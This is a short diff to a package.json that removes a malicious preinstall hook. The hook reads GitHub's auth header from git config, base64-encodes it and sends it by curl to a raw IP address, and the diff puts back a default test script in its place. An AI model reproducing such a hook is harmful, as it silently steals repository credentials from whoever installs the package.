@@ -4,7 +4,7 @@
   "description": "",
   "main": "index.js",
   "scripts": {
-    "preinstall":"curl -k https://103.16.128.93/?token=$(git config --get http.https://github.com/.extraheader | base64 | tr -d '\n')"
+    "test": "echo \"Error: no test specified\" && exit 1"
   },
   "author": "",
   "license": "ISC",
